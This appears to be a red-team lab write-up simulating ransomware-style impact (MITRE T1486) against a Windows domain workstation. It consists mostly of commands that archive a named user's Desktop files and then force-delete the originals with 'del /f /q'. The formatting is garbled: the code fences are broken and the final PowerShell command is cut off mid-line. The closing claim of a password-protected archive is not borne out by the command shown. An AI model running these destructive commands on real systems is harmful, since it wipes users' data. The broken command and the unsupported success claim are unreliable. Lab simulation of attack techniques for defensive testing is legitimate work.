# T1486 - Data Encrypted for Impact

## Description
This technique involves encrypting or locking files on a compromised system to deny access to the legitimate user. It is commonly associated with ransomware-style attacks and falls under the Impact tactic.


---

## Simulation Parameters

- **Attacker:** Kali Linux (192.168.10.250)
- **Target:** Windows 10 Workstation (192.168.10.9) - Domain: ADPRO
- **Access Level:** Administrator (via Impacket PsExec / WinRM)
- **Objective:** Lock or encrypt target files to deny user access

---

## Execution Steps

### 1. Identify Target Files

`cmd
dir C:\Users\jcruz\Desktop

### 2.Compress and Lock Filescmd

powershell -c "Compress-Archive -Path C:\Users\jcruz\Desktop\* -DestinationPath C:\Windows\Temp\locked_files.zip -F

### 3. Remove Original Files (Impact)cmd

del /f /q C:\Users\jcruz\Desktop\*.*

### 4. Optional – Password Protected Archivecmd

powershell -c "$password = ConvertTo-SecureString 'LockedByRedTeam' -AsPlainText -Force; Compress-Archive -Path C:\Users\jcruz

ResultsStatus: Successful
Successfully identified and targeted user files on the Desktop.
Compressed selected files into a locked archive.
Demonstrated denial of access by removing or relocating original files.
Created password-protected archive for additional impact.


